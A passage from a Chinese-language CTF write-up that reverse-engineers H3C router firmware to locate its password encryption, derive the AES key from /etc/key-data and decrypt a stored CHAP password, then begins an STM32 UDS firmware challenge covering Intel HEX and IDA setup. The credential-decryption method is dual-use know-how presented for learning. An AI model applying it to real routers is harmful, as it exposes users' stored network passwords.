class="hljs-section">-------------------------</span><br>0x68 unknown<span class="hljs-emphasis">_struct</span><br><span class="hljs-emphasis">0xE0 filename</span><br><span class="hljs-emphasis">0x4 file_size</span><br><span class="hljs-emphasis">0x4 unknown_var</span><br><span class="hljs-emphasis">0x4 padding(FF FF FF FF)</span><br><span class="hljs-emphasis">文件本身,大小取决于file_size</span><br><span class="hljs-emphasis">-------------------------</span><br><span class="hljs-emphasis">0x68 unknown_struct</span><br><span class="hljs-emphasis">0xE0 filename</span><br><span class="hljs-emphasis">0x4 file_size</span><br><span class="hljs-emphasis">0x4 unknown</span><br><span class="hljs-emphasis">0x4 padding(FF FF FF FF)</span><br><span class="hljs-emphasis">文件本身,大小取决于file_size</span><br><span class="hljs-emphasis">-------------------------</span><br><span class="hljs-emphasis">0x68 unknown_struct</span><br><span class="hljs-emphasis">0xE0 filename</span><br><span class="hljs-emphasis">0x4 file_size</span><br><span class="hljs-emphasis">0x4 unknown</span><br><span class="hljs-emphasis">0x4 padding(FF FF FF FF)</span><br><span class="hljs-emphasis">文件本身,大小取决于file_</span>size<br><span class="hljs-code">-------------------------</span><br><span class="hljs-code">............</span><br></code></pre></td></tr></table></figure><p>这里可以开发一个提取的脚本作为对原本项目的补充，但是笔者最近比较忙，先开个坑日后再填</p><p>同样对比分析其它分区文件可知文件系统位于<code>mpu.cpio.xz</code>中，提取出该文件</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/6.png" alt="6"></p><p>另外，LianSecurity的IOT分析工具Shambles可以一键解包出该固件的文件系统并自动分析固件信息和潜在漏洞，非常好用，如图</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/7.png" alt="7"></p><h4 id="定位加解密代码"><a href="#定位加解密代码" class="headerlink" title="定位加解密代码"></a>定位加解密代码</h4><h5 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h5><p>密文是base64，我们搜索包含base64码表的文件，根据文件名判断加密可能存在于<code>/lib/libcrypto.so.1.1.1.185</code>、<code>/lib/liblauth.so.1.1.1.602</code>、<code>/lib/libencrypt.so.0.0.0.14</code></p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/8.png" alt="8"></p><p>最终在<code>/lib/libencrypt.so.0.0.0.14</code>找到了符合加解密特征的函数<code>PASSWORD_Encrypt</code>和<code>PASSWORD_Decrypt</code></p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/9.png" alt="9"></p><h5 id="正向分析"><a href="#正向分析" class="headerlink" title="正向分析"></a>正向分析</h5><p>在服务程序校验客户端传来的用户名密码的过程中必然存在解密操作，因此我们将pppoe相关的服务程序作为切入点。在目录搜索ppp，如下</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/10.png" alt="10"></p><p>pppoecd和pppoesd是pppoe服务程序，分别负责维护和管理PPPoE连接、发现和协商PPPoE会话，但是其中并没有用户认证相关代码。</p><p>参考<a href="https://blog.csdn.net/jzzjsy/article/details/14450057">PPPOE和pppd的流程详解</a>，PPPOE协议是基于PPP协议的协议，在PPPOE应用程序中并没有将PPP协议实现，PPP协议是由PPPD这个用户空间程序实现的。逆向分析图中的PPPD程序，我们可以发现PAP和CHAP两种身份认证的处理函数中都用到了<code>PASSWORD_Decrypt</code>函数。<img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/11.png" alt="11"></p><p>部分函数调用链如下:</p><ul><li>PAP</li></ul><p>main -&gt; PPP_Worker_DataInit -&gt; PPP_PACKET_Create -&gt; ppp_packet_Create -&gt; sub_120067D10 -&gt; sub_120067BD8 -&gt; PPP_PROTO_ReceivePacket -&gt; PPP_NEGO_ProcPacket&#x2F;PPP_NEGO_ProcAAAMsg -&gt; PPP_PAP_ReceivePacket&#x2F;PPP_PAP_ReceiveEvent -&gt; sub_1200A6700 -&gt; PASSWORD_Decrypt</p><ul><li>CHAP</li></ul><p> main -&gt; PPP_Worker_DataInit -&gt; PPP_PACKET_Create -&gt; ppp_packet_Create -&gt; sub_120067D10 -&gt; sub_120067BD8 -&gt; PPP_PROTO_ReceivePacket -&gt; PPP_NEGO_ProcPacket -&gt; PPP_CHAP_ReceivePacket -&gt; sub_120085B60 -&gt; PASSWORD_Decrypt</p><p>以及pppd中的<code>LAUTH_GetUserPassword</code>也调用了<code>PASSWORD_Decrypt</code>函数，该函数来自<code>/lib/liblauth.so.1.1.1.602</code>库文件</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/12.png" alt="Q12"></p><p><code>readelf -d</code>查看pppd程序链接了哪些库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">readelf -d pppd</span><br><br>Dynamic section at offset 0xce0 contains 56 entries:<br>  Tag        Type                         Name/Value<br> 0x0000000000000001 (NEEDED)             Shared library: [libdl.so.0]<br> 0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]<br> 0x0000000000000001 (NEEDED)             Shared library: [libsystem.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libipbase.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libcioctl.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libdns.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libcryptoex.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libcrypto.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libencrypt.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libkevent.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libpam.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libdombasic.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libl3vpn.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libppp.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [liblauth.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libbitmap.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libcli.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libddr.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libmor.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libvlan.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libaclmgr.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libif.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libtcmalloc.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libtrange.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libdhcpsr.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [librtstatic.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libvsrp.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libsync.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libchannel.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libeth.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libancp.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libip6addr.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libmemalert.so]<br> 0x0000000000000001 (NEEDED)             Shared library: [libgcc_s.so.1]<br> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.0]<br></code></pre></td></tr></table></figure><p><code>nm -D</code> + <code>grep</code>查看哪个库中定义了<code>PASSWORD_Decrypt</code>函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nm -D libencrypt.so.0.0.0.14  | grep PASSWORD_Decrypt</span><br>0000000000003728 T PASSWORD_Decrypt<br>0000000000003358 T PASSWORD_DecryptBin<br></code></pre></td></tr></table></figure><p>最终定位到<code>libencrypt.so.0.0.0.14</code></p><h4 id="分析加密算法"><a href="#分析加密算法" class="headerlink" title="分析加密算法"></a>分析加密算法</h4><p>将16字节随机数(IV)和password传入加密函数sub_2FC8</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/13.png" alt="13"></p><p>sub_2FC8中操作如下</p><ul><li>KEY_GetKey生成AES初始密钥</li><li>拼接16字节IV和password，存在data</li><li>由初始密钥enc_key生成加密密钥AES_key</li><li>使用IV和密钥AES_key加密data中0x10偏移处的password</li><li>对data进行base64编码后在开头拼接<code>$c$3$</code>，加密完成并返回</li></ul><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/14.png" alt="14"></p><p>分析KEY_GetKey函数生成AES初始密钥的过程</p><p> 读取了<code>/etc/key-data</code>文件，并且从0x102偏移开始解析数据</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/15.png" alt="15"></p><p>解析了每个区块并将ID和CT_SIZE存入全局缓冲区</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/16.png" alt="16"></p><p>进入KEY_GetKeyData继续解析</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/17.png" alt="17"></p><p>对密钥数据也进行AES-CTR解密</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/18.png" alt="18"></p><p>解密密钥数据用的初始密钥是由Key_data[2:102]数据以如下方式生成的哈希</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/19.png" alt="19"></p><p>总结：key_data的0x2-0x102是用于生成初始密钥的数据，0x102偏移开始数据分为一个个区块，每个区块结构如下</p><ul><li>1-2字节为区块ID</li><li>3-4字节为加密后AES密钥的密文长度</li><li>5-20字节是IV</li><li>AES密钥的密文(CT)</li></ul><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/20.png" alt="20"></p><h4 id="解密密码"><a href="#解密密码" class="headerlink" title="解密密码"></a>解密密码</h4><p>先获取这里的初始密钥</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/21.png" alt="21"></p><p>如图，用的是第4区块的数据，结构如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ID</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">04</span> <br><span class="hljs-attribute">CT_SIZE</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">34</span> <br><span class="hljs-attribute">IV</span><br><span class="hljs-attribute">9B</span> <span class="hljs-number">33</span> AE DE <span class="hljs-number">8</span>E <span class="hljs-number">29</span> B2 <span class="hljs-number">2</span>A <span class="hljs-number">9</span>E D1 <span class="hljs-number">8</span>C <span class="hljs-number">1</span>D CD A7 <span class="hljs-number">32</span> <span class="hljs-number">58</span> <br><span class="hljs-attribute">CT</span><br><span class="hljs-attribute">DF</span> BF <span class="hljs-number">4</span>E <span class="hljs-number">75</span> AD D5 <span class="hljs-number">29</span> <span class="hljs-number">2</span>B <span class="hljs-number">54</span> <span class="hljs-number">78</span> BE <span class="hljs-number">47</span> <span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">14</span> <span class="hljs-number">8</span>A <span class="hljs-number">34</span> <span class="hljs-number">7</span>B F4 FD EC FC <span class="hljs-number">7</span>A EE <span class="hljs-number">87</span> AF <span class="hljs-number">83</span> C6 <span class="hljs-number">2</span>E <span class="hljs-number">3</span>B <span class="hljs-number">0</span>B <span class="hljs-number">26</span> <span class="hljs-number">42</span> <span class="hljs-number">2</span>F <span class="hljs-number">13</span> <span class="hljs-number">48</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>B <span class="hljs-number">44</span> <span class="hljs-number">65</span> AD A8 CA <span class="hljs-number">0</span>F F4 <span class="hljs-number">8</span>D <span class="hljs-number">96</span> <span class="hljs-number">10</span> <span class="hljs-number">84</span> <span class="hljs-number">68</span> <span class="hljs-number">7</span>B <span class="hljs-number">6</span>A<br></code></pre></td></tr></table></figure><p>生成解密密钥数据用的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<br><br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key-data&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>data = fp.read()[<span class="hljs-number">0x2</span>:<span class="hljs-number">0x102</span>]<br>a = sha512()<br>a.update(data[<span class="hljs-number">0x40</span>:<span class="hljs-number">0x80</span>])<br>a.update(data[<span class="hljs-number">0x0</span>:<span class="hljs-number">0x40</span>])<br>a.update(data[<span class="hljs-number">0x80</span>:])<br><span class="hljs-built_in">print</span>(a.digest()[:<span class="hljs-number">0x20</span>].<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#ecc679703bb2daf7c09a941cb992dcdd03150e0f67ed9b32a548d8624add9c07</span><br></code></pre></td></tr></table></figure><p>获得解密PASSWORD用的密钥数据</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/22.png" alt="22"></p><p>密钥数据格式如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">IV_SIZE<br><span class="hljs-number">0010</span><br>KEY_SIZE<br><span class="hljs-number">0020</span><br>IV<br><span class="hljs-keyword">c</span><span class="hljs-number">695</span><span class="hljs-keyword">c</span><span class="hljs-number">466</span>f<span class="hljs-number">32e90</span>d<span class="hljs-number">0</span>fb<span class="hljs-number">12</span>ed<span class="hljs-number">31</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">72265</span><br>KEY<br>a<span class="hljs-number">2e6658865746</span>b<span class="hljs-number">4</span>b<span class="hljs-number">954</span>f<span class="hljs-number">0</span>bd<span class="hljs-number">37</span>fd<span class="hljs-number">1</span>ece<span class="hljs-number">03</span>b<span class="hljs-number">1</span>acb<span class="hljs-number">47</span>fbc<span class="hljs-number">543</span>ec<span class="hljs-number">32</span>d<span class="hljs-number">35987</span>b<span class="hljs-number">20</span>b<span class="hljs-number">6866</span><br></code></pre></td></tr></table></figure><p>对CHAP的PASSWORD的密文解BSAE64(不知道为什么不能解密PAP的数据，可能因为PAP传输明文不需要解密?)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#CHAP</span><br><span class="hljs-attribute">IV</span><br><span class="hljs-attribute">4c</span> a6 <span class="hljs-number">09</span> <span class="hljs-number">5</span>d <span class="hljs-number">3</span>e <span class="hljs-number">11</span> <span class="hljs-number">98</span> c2 <span class="hljs-number">2</span>f <span class="hljs-number">3</span>c <span class="hljs-number">74</span> <span class="hljs-number">17</span> fb <span class="hljs-number">91</span> <span class="hljs-number">21</span> <span class="hljs-number">7</span>f <br><span class="hljs-attribute">CT</span><br><span class="hljs-attribute">da</span> <span class="hljs-number">03</span> de <span class="hljs-number">48</span> ec <span class="hljs-number">90</span> <span class="hljs-number">8</span>b ab dc f1 <span class="hljs-number">89</span> <span class="hljs-number">7</span>d <span class="hljs-number">1</span>f fb <span class="hljs-number">7</span>c <span class="hljs-number">4</span>c aa <span class="hljs-number">7</span>d bc <span class="hljs-number">74</span> <span class="hljs-number">2</span>b <span class="hljs-number">40</span> c0 a2 <span class="hljs-number">44</span> <span class="hljs-number">74</span> a5 dd eb b1 <span class="hljs-number">16</span> d6 <span class="hljs-number">47</span> <span class="hljs-number">9</span>b <span class="hljs-number">7</span>d <span class="hljs-number">0</span>a bd f1 <span class="hljs-number">49</span> b6 <span class="hljs-number">28</span> <span class="hljs-number">3</span>d da <span class="hljs-number">20</span> <span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/23.png" alt="23"></p><h2 id="2024SCTF-uds"><a href="#2024SCTF-uds" class="headerlink" title="2024SCTF uds"></a>2024SCTF uds</h2><p>考点：STM32单片机裸机固件逆向、uds诊断服务</p><p>题目描述</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">能告诉我汽车的VIN码吗？<br>Can you <span class="hljs-keyword">tell</span> <span class="hljs-keyword">me</span> <span class="hljs-keyword">the</span> VIN <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> car?<br></code></pre></td></tr></table></figure><p>给了32位arm小端裸机固件<code>uds.hex</code>，内含uds诊断服务代码，程序源码修改自<a href="https://github.com/driftregion/iso14229">iso14229</a>仓库，要求逆向固件得到汽车的VIN码</p><h3 id="Intel-Hex文件格式"><a href="#Intel-Hex文件格式" class="headerlink" title="Intel Hex文件格式"></a>Intel Hex文件格式</h3><p>关于hex文件</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">以*.<span class="hljs-built_in">hex</span>为后缀的文件我们称之为<span class="hljs-built_in">HEX</span>文件。<span class="hljs-built_in">hex</span>是intel规定的标准，<span class="hljs-built_in">hex</span>的全称是Intel <span class="hljs-built_in">HEX</span>，此类文件通常用于传输将被存于ROM或EEPROM中的程序和数据。是由一行行符合Intel <span class="hljs-built_in">HEX</span>文件格式的文本所构成的ASCII文本文件。<br>这种文件格式主要用于保存单片机固件。<br></code></pre></td></tr></table></figure><ul><li><a href="https://en.wikipedia.org/wiki/Intel_HEX">Intel HEX wikipedia</a></li><li><a href="https://www.cnblogs.com/aqing1987/p/4185362.html">读懂 Intel Hex 文件</a></li></ul><p>以本题的<code>uds.hex</code>为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">:020000040800F2   <br>:10000000B0490020AD020008A7241008BD03000875<br>......<br>:104EE000D1421052015890D0030090D00302180113<br>:020000040810E2<br>:10000000202A04DB203A00FA02F1002070479140D8<br>......<br>:104EB00061206C6172676572206275666665720A50<br>:044EC00000000000EE<br>:040000050800029954<br>:00000001FF<br></code></pre></td></tr></table></figure><ul><li><code>:020000040800F2</code>是拓展线性地址记录，指定了地址空间的高16位为<code>0x0800</code></li><li><code>:020000040810E2</code>也是拓展线性地址记录，指定从此地址空间的高16位为<code>0x0810</code></li><li><code>:104EB00061206C6172676572206275666665720A50</code>表示将0x10字节的数据<code>00 61 20 6C 61 72 67 65 72 20 62 75 66 66 65 72 0A 50</code>存放在(线性拓展地址 &lt;&lt; 4 + 0x4EB0)地址的存储空间</li><li><code>:040000050800029954</code>是启动线性地址记录，表示程序起始执行地址为<code>0x08000298+1</code>，根据arm规范，这里的末位的1是thumb指示位，所以实际起始地址为<code>0x08000298</code>，采用16位的thumb指令集。</li><li>其余语句都是类似<code>:104EB00061206C6172676572206275666665720A50</code>的数据长度 + 地址 + 数据</li></ul><p>hex和bin文件转换有如下几种方式</p><ul><li>objcopy工具(gnulinux自带无需安装)</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">objcopy -I ihex -O binary input.hex output.bin  #hex -&gt; bin<br>objcopy -I binary -O ihex input.bin output.hex  #bin -&gt; hex<br></code></pre></td></tr></table></figure><ul><li><a href="https://srecord.sourceforge.net/">SRecord软件包</a>中的srec_cat工具</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install srecord #安装srecord包<br>srec_cat uds.hex -intel -offset -0x08000000 -o uds.bin -binary #hex -&gt; bin<br>srec_cat uds.bin -binary -offset -0x08000000 -o uds.hex -intel #bin -&gt; hex<br></code></pre></td></tr></table></figure><ul><li><p>Hexview</p><p>Vector公司的产品CANape中的一个小工具，官方渠道是到<a href="https://www.vector.com/at/en/support-downloads/download-center">官网</a>下载CANape包找出Hexview。有好人单独分享了<a href="https://gitcode.com/open-source-toolkit/6b787">Hexview工具</a>。</p></li></ul><p>srec工具转换得到的bin文件很大，ida打开直接卡死，所以建议用objcopy和HexView </p><h3 id="如何正确反编译"><a href="#如何正确反编译" class="headerlink" title="如何正确反编译"></a>如何正确反编译</h3><p>rom基址是0x08000000，程序入口在0x08000298，使用16位的thumb指令集，ram基址根据代码判断为0x20000000</p><p>包括VIN密文在内的很多变量存储在ram中，需要进行设置，否则会如图所示爆红</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/24.png" alt="24"></p><p>还有一些爆红的变量，并不影响关键代码的逆向，不处理也没关系。对0x58024410这个地址进行信息搜集可以判断这是AHB总线的地址，猜测出题人用的设备应该是STM32，CPU型号是Cortex-M系列，指令集为ARMv7-M兼容16位thumb</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/25.png" alt="25"></p><h4 id="反编译intel-hex格式"><a href="#反编译intel-hex格式" class="headerlink" title="反编译intel hex格式"></a>反编译intel hex格式</h4><p>ida能自动解析Intel hex格式，这意味着hex文件中包含的信息都不需要再手动设置，但是hex中没有ram信息，所以ram段要我们自己创建，ram基址需要自己判断。</p><p>拖进32位ida选择<code>arm Little Endian</code>打开<code>uds.hex</code></p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/26.png" alt="26"></p><p>Edit -&gt; Segments -&gt; Create segment，添加ram段</p><p><img src="/2024/11/06/%E4%BB%8E2024L3hCTF&&SCTF%E4%B8%89%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0h3c%E8%B7%AF%E7%94%B1%E5%99%A8&stm32%E8%A3%B8%E6%9C%BA&Infineon%E8%BD%A6%E6%9C%BA%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91/27.png" alt="27"></p><p>创建ram段后其它变量正常了，vin变量还是地址形式，右键set 